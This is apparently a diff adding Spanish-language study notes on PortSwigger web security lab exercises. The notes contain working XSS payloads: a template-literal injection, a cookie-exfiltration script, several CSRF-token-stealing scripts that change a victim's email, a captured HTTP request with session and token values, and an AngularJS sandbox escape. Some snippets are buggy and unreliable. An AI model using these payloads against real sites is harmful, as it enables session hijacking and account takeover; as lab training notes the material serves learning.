@@ -1060,3 +1060,365 @@ Para resolver este laboratorio, envíe un comentario que llame al alert función
 https://cdssass.com&apos;+alert(1)+&apos;
 
 
+
+
+
+
+
+
+
+
+# XSS en template literal con caracteres unicode escapados
+En esta clase abordamos un XSS reflejado que ocurre dentro de una cadena de plantilla de JavaScript —también conocida como template literal—, donde el valor introducido por el usuario se refleja en tiempo de ejecución dentro de un fragmento delimitado por comillas invertidas.
+
+El sistema aplica un filtrado agresivo que codifica signos angulares, comillas simples y dobles, barras invertidas y las propias comillas invertidas, bloqueando así inyecciones clásicas. Sin embargo, no restringe las expresiones contenidas entre el símbolo de dólar y llaves, que son interpretadas como código ejecutable dentro de la plantilla.
+
+Aprovechamos esta brecha introduciendo una expresión que se evalúa directamente al cargar la página, sin necesidad de romper el delimitador original. Al estar el contenido ya dentro de una cadena ejecutable, el navegador interpreta la expresión de inmediato y ejecuta la función deseada.
+
+Este laboratorio demuestra cómo las cadenas de plantilla pueden ser un punto crítico de inyección si no se filtran expresiones embebidas, y destaca la importancia de neutralizar todos los elementos interpretables dentro de estructuras modernas de JavaScript.
+
+
+## Laboratorio: XSS reflejado en una plantilla literal con corchetes angulares, comillas simples, dobles, barra invertida y comillas invertidas con escape Unicode
+PRACTICANTE
+
+LAB
+No resuelto
+Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad del blog de búsqueda. La reflexión ocurre dentro de una cadena de plantilla con corchetes angulares, comillas simples y dobles codificadas en HTML y comillas invertidas escapadas. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función dentro de la cadena de plantilla.
+
+
+
+
+
+
+
+<script>
+var message = `0 search results for '\u003cscript\u003ealert(1)\u003c/script\u003e'`;
+document.getElementById('searchMessage').innerText = message;
+</script>
+
+
+console.log(`mensaje de: ${mensaje}`) 
+VM247:1 mensaje de: probando
+
+
+
+console.log('mensaje de: ${mensaje}') 
+mensaje de: ${mensaje}
+
+console.log('mensaje de: ${alert(0)}'); 
+
+console.log(`mensaje de: ${alert(0)}`); 
+
+
+
+
+- ${alert(0)}
+
+
+
+
+
+
+
+
+# Robo de cookies mediante XSS
+En esta clase ponemos en práctica un caso realista de XSS almacenado con robo de sesión, donde el código malicioso se inyecta en un comentario de blog y se activa cuando otro usuario —en este caso, una víctima simulada— visualiza la página.
+
+Aprovechamos la vulnerabilidad para insertar un fragmento de código que, al ejecutarse en el navegador de la víctima, recopila su cookie de sesión y la envía en segundo plano a un servidor externo controlado a través de Burp Collaborator, una herramienta diseñada para capturar interacciones fuera de banda.
+
+Una vez interceptada la cookie, la utilizamos para suplantar la identidad del usuario afectado, inyectándola en nuestras propias peticiones mediante un proxy o el módulo Repeater de Burp Suite. Esto nos da acceso a áreas privadas como si fuéramos la víctima.
+
+Este laboratorio demuestra cómo un XSS puede ir más allá de una simple alerta visual y usarse para comprometer directamente cuentas de usuario, lo que lo convierte en uno de los vectores más críticos en seguridad web.
+
+## Laboratorio: Explotación de secuencias de comandos entre sitios para robar cookies
+PRACTICANTE
+
+LAB
+No resuelto
+Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, explote la vulnerabilidad para exfiltrar la cookie de sesión de la víctima y luego use esta cookie para hacerse pasar por la víctima.
+
+Nota
+Para evitar que la plataforma Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, debes utilizar el servidor público predeterminado de Burp Collaborator.
+
+Algunos usuarios notarán que existe una solución alternativa a este laboratorio que no requiere Burp Collaborator. Sin embargo, es mucho menos sutil que exfiltrar la galleta.
+
+
+### Con BurpSuite Collaborator Profesional
+
+<script>
+  fecth("/?cookie="+btoa(document.cookie))
+</script>
+
+
+echo -n 'cookie' | base64 -d; echo  
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Captura de contraseñas mediante XSS
+En esta clase llevamos el XSS almacenado un paso más allá, enfocándonos en capturar las credenciales de un usuario legítimo en lugar de solo su cookie de sesión. El entorno vulnerable es un sistema de comentarios donde el código inyectado queda persistente y se ejecuta cuando un visitante visualiza el contenido.
+
+Aprovechamos esta oportunidad para insertar campos de entrada personalizados en el comentario, imitando elementos ya existentes en la página. Añadimos un evento que, cuando el usuario introduce su contraseña, intercepta el valor junto con su nombre de usuario y los envía automáticamente al servidor público de Burp Collaborator.
+
+Una vez que recibimos esta información en el panel de Collaborator, podemos utilizar las credenciales capturadas para iniciar sesión como la víctima, accediendo así directamente a su cuenta.
+
+Este laboratorio demuestra cómo el XSS puede emplearse para técnicas de credential harvesting, especialmente cuando se combinan con ingeniería social y campos camuflados. También refuerza la importancia de tratar todo contenido generado por usuarios como potencialmente malicioso.
+
+
+Laboratorio: Explotación de secuencias de comandos entre sitios para capturar contraseñas
+PRACTICANTE
+
+LAB
+No resuelto
+Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, aproveche la vulnerabilidad para exfiltrar el nombre de usuario y la contraseña de la víctima y luego use estas credenciales para iniciar sesión en la cuenta de la víctima.
+
+Nota
+Para evitar que la plataforma Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, debes utilizar el servidor público predeterminado de Burp Collaborator.
+
+Algunos usuarios notarán que existe una solución alternativa a este laboratorio que no requiere Burp Collaborator. Sin embargo, es mucho menos sutil que exfiltrar las credenciales.
+
+
+
+### Con BurpSuite Collaborator Profesional
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Evasión de CSRF usando XSS [1/2]
+
+En esta clase explotamos un XSS almacenado para ejecutar una acción que normalmente estaría protegida por medidas anti-CSRF. La aplicación permite insertar comentarios maliciosos que se ejecutan cuando otro usuario visita el blog, lo que nos permite acceder a sus sesiones activas y realizar acciones en su nombre.
+
+Nuestro objetivo es cambiar la dirección de correo electrónico del usuario afectado. Para ello, necesitamos primero obtener el token CSRF válido que protege dicha operación. Aprovechamos el XSS para hacer una petición al área de configuración de cuenta, capturar el contenido de la respuesta y extraer el token desde el HTML.
+
+Una vez que tenemos el token, generamos una segunda petición desde el navegador de la víctima, enviando el token y la nueva dirección de correo. Como todo ocurre dentro de su propia sesión, la operación se realiza con éxito.
+
+Este laboratorio demuestra cómo un XSS puede romper las defensas de tipo CSRF y subraya la importancia de que los tokens no solo estén presentes, sino que también estén correctamente aislados del acceso por parte de scripts inyectados.
+
+ 
+
+
+### Laboratorio: Explotación de XSS para eludir las defensas CSRF
+PRACTICANTE
+
+LAB
+No resuelto
+Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Para resolver el laboratorio, explota la vulnerabilidad para robar un token CSRF, que luego puedes usar para cambiar la dirección de correo electrónico de alguien que vea los comentarios de la publicación del blog.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: 
+            
+              wiener :peter
+
+
+<script>
+  var req=XMLHttpRequest();
+  req.open("GET","/my-account",false)
+  req.send();
+  var respnse = req.responseText;
+  var csrf_token = response.match(/name="csrf" value=*(.*?)*/)[1];
+  var req2=XMLHttpRequest();
+  req2.open("GET","http://_?token=" +btoa(csrf_token));
+  req2.send();
+</script>
+
+
+echo -n 'cookie' | base64 -d; echo  
+
+
+
+
+
+
+
+------------------forma 2
+
+
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+
+
+
+-----Formulario
+
+@ --> %40
+
+
+Leave a comment
+Comment:
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test%40test.com')
+};
+</script>
+Name:
+test1
+Email:
+mexed18326@mcenb.com
+Website:
+https://test1.com
+
+
+
+
+
+
+
+
+POST /my-account/change-email HTTP/2
+Host: 0a0200cc032e79fe805e26c100d30074.web-security-academy.net
+Cookie: session=3ad392RC0TzVEaN4sKC1hHVBYwy9tPeV
+Content-Length: 65
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0a0200cc032e79fe805e26c100d30074.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0200cc032e79fe805e26c100d30074.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=testing@testing.com&csrf=QsYcO0AB3a5cWKbUecRR0V7T7NF55lH3
+
+
+
+
+
+------------------forma 3
+
+
+<script>
+  var req=XMLHttpRequest();
+  req.open("GET","/my-account",false)
+  req.send();
+  var respnse = req.responseText;
+  var csrf_token = response.match(/name="csrf" value=*(.*?)*/)[1];
+  var req2=XMLHttpRequest();
+  req2.open('post', '/my-account/change-email', true);
+  req2.setRequestHeader("Content-Type: application/x-www-form-urlencoded");
+  var data = 'email='+encodeURIComponent('test@test.com')+'&csrf='+encodeURIComponent(token);
+  req2.send()
+</script>
+
+
+
+
+
+
+
+
+--Vesrion mejorada
+
+<script>
+  // Obtener el token CSRF de la página de la cuenta
+  var request = new XMLHttpRequest();
+  request.open("GET", "/my-account", false); // Sincrónico (no recomendado en producción)
+  request.send();
+  
+  // Verificar que la respuesta sea exitosa
+  if (request.status === 200) {
+    var response = request.responseText;
+    
+    // Extraer el token CSRF de forma más robusta
+    var csrfMatch = response.match(/name="csrf" value="([^"]+)"/);
+    
+    if (csrfMatch && csrfMatch[1]) {
+      var csrfToken = csrfMatch[1];
+      
+      // Enviar la petición para cambiar el email
+      var changeRequest = new XMLHttpRequest();
+      changeRequest.open('POST', '/my-account/change-email', true);
+      changeRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      
+      // Codificar los parámetros para seguridad
+      var postData = 'email=' + encodeURIComponent('test@test.com') + 
+                    '&csrf=' + encodeURIComponent(csrfToken);
+      
+      changeRequest.send(postData);
+    } else {
+      console.error("No se pudo encontrar el token CSRF");
+    }
+  } else {
+    console.error("Error al cargar la página de cuenta:", request.status);
+  }
+</script>s
+
+
+
+
+
+
+
+
+
+
+
+# Escape de sandbox AngularJS sin cadenas [1/2]
+En esta clase de nivel ‘experto’, trabajamos con una vulnerabilidad de ‘XSS reflejado’ en una aplicación que utiliza AngularJS con restricciones avanzadas. La inyección ocurre dentro de una expresión Angular, pero el entorno está configurado para evitar el uso de ‘eval’ y bloquear por completo cualquier intento de utilizar cadenas de texto.
+
+El enfoque consiste en usar funciones nativas de JavaScript para construir cadenas de forma indirecta. Aprovechamos el método ‘toString()‘ y la propiedad ‘constructor‘ para acceder al prototipo de los objetos y redefinir cómo se comportan. En concreto, se sobrescribe el método ‘charAt‘ del prototipo de las cadenas, lo que permite eludir el sistema de seguridad interno de AngularJS.
+
+Luego pasamos una expresión al filtro ‘orderBy‘, y generamos el código deseado utilizando ‘fromCharCode‘ con los valores numéricos correspondientes a los caracteres de la cadena ‘x=alert(1)‘. Como hemos alterado el comportamiento interno de las cadenas, AngularJS permite que esta expresión se ejecute donde normalmente estaría bloqueada.
+
+Este laboratorio demuestra cómo es posible romper entornos supuestamente seguros mediante manipulación de bajo nivel, sin depender de comillas o funciones evaluadoras explícitas.
+
+## Laboratorio: XSS reflejado con escape de sandbox Angularjs sin cuerdas
+EXPERTO
+
+LABORATORIO
+No resuelto
+Este laboratorio utiliza AngularJS de una manera inusual donde la función $ eval no está disponible y no podrá usar ninguna cadena en AngularJS.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos de sitios cruzados que escape del sandbox y ejecute la función de alerta sin usar la función $ eval.
+
+
+
+
+
+/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
